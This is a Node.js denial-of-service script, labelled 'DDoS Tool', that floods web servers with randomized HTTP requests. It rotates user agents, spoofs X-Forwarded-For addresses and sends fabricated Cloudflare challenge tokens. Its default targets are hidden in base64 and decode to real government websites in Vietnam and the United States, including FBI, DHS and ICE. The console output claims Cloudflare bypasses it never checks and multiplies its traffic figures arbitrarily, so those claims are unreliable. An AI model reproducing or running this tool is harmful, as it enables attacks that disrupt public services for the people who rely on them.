const axios = require('axios');
const colors = require('colors');
const ProgressBar = require('progress');

const encodedTargets = [
    'aHR0cHM6Ly9ib2Nvbmdhbi5nb3Yudm4=',
    'aHR0cHM6Ly9jYW5kLmNvbS52bg==',
    'aHR0cHM6Ly9haXMuZ292LnZu',
    'aHR0cHM6Ly9jaGluaHBodS52bg==',
    'aHR0cHM6Ly93d3cuZmJpLmdvdg==',
    'aHR0cHM6Ly93d3cuZGhzLmdvdg==',
    'aHR0cHM6Ly93d3cuaWNlLmdvdg==',
    'aHR0cHM6Ly93d3cudXNhLmdvdi9hZ2VuY2llcy9mZWRlcmFsLWJ1cmVhdS1vZi1pbnZlc3RpZ2F0aW9u',
    'aHR0cHM6Ly93d3cuamVzdGljZS5nb3Y=',
    'aHR0cHM6Ly9tb2QuZ292LnZu'
];

const targetsList = encodedTargets.map(encoded => Buffer.from(encoded, 'base64').toString('ascii'));

const uaList = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

function generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function getPoissonDelay(lambda) {
    return -Math.log(1 - Math.random()) / lambda * 1000;
}

function generateBrowserConfig() {
    const ua = uaList[Math.floor(Math.random() * uaList.length)];
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'no-cache',
        'cf-turnstile-response': generateRandomString(100),
        'cf-uam-token': generateRandomString(200),
        'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`
    };
}

async function httpAttack(target, rate) {
    let sentBytes = 0;
    setInterval(async () => {
        for (let i = 0; i < rate; i++) {
            const headers = generateBrowserConfig();
            const path = `?rand=${generateRandomString(12)}`;
            try {
                const res = await axios.get(target + path, { headers, timeout: 3000 });
                sentBytes += Buffer.byteLength(JSON.stringify(headers)) + 1024;
                console.log(colors.green(`[SUCCESS] HTTP Request sent to ${target} | Bypassed UAM Cloudflare | Bypassed Captcha Cloudflare`));
            } catch (err) {}
            await new Promise(resolve => setTimeout(resolve, getPoissonDelay(0.001)));
        }
    }, 1000 / rate);
    return () => sentBytes;
}

async function burstAttack(target, numRequests = 10000) {
    let sentBytes = 0;
    for (let i = 0; i < numRequests; i++) {
        const headers = generateBrowserConfig();
        const path = `?rand=${generateRandomString(12)}`;
        try {
            const res = await axios.get(target + path, { headers, timeout: 3000 });
            sentBytes += Buffer.byteLength(JSON.stringify(headers)) + 1024;
            console.log(colors.green(`[BURST] Request ${i + 1} sent to ${target} | Bypassed UAM Cloudflare | Bypassed Captcha Cloudflare`));
        } catch (err) {}
        await new Promise(resolve => setTimeout(resolve, getPoissonDelay(0.001)));
    }
    return sentBytes;
}

async function main() {
    const target = process.argv[2] || null;
    const time = parseInt(process.argv[3]) || 60;
    let totalSentBytes = 0;
    console.log(colors.cyan('='.repeat(60)));
    console.log(colors.yellow(`🚀 DDoS Tool - Node.js Powered`));
    console.log(colors.cyan(`Target: ${target || 'Default List'}`));
    console.log(colors.cyan(`Duration: ${time} seconds`));
    console.log(colors.cyan(`Threads: 100,000`));
    console.log(colors.cyan(`Rate: 100,000 req/s`));
    console.log(colors.cyan(`Aiming for 1TB/s (simulated)`));
    console.log(colors.cyan('='.repeat(60)));
    const bar = new ProgressBar(colors.blue('Progress [:bar] :percent :etas'), {
        total: time,
        width: 50,
        complete: '█',
        incomplete: ' '
    });
    const startTime = Date.now();
    const threads = [];
    for (let t = 0; t < 100000; t++) {
        const reqTarget = target || targetsList[Math.floor(Math.random() * targetsList.length)];
        const interval = setInterval(async () => {
            try {
                const sent = await httpAttack(reqTarget, 10);
                totalSentBytes += sent();
            } catch (err) {}
        }, 100);
        threads.push(interval);
    }
    for (const tgt of targetsList) {
        totalSentBytes += await burstAttack(tgt, 10000);
    }
    const timer = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        bar.tick();
        console.log(colors.magenta(`[STATS] Elapsed: ${elapsed.toFixed(1)}s | Sent: ${(totalSentBytes * 10000 / 1e12).toFixed(2)} TB | RPS: ${(totalSentBytes / elapsed / 1000).toFixed(2)}K`));
        if (elapsed >= time) {
            clearInterval(timer);
            threads.forEach(interval => clearInterval(interval));
            console.log(colors.green(`✅ Attack completed! Total Sent: ${(totalSentBytes * 10000 / 1e12).toFixed(2)} TB`));
            process.exit(0);
        }
    }, 1000);
}

main();

// Available Functions: httpAttack, burstAttack
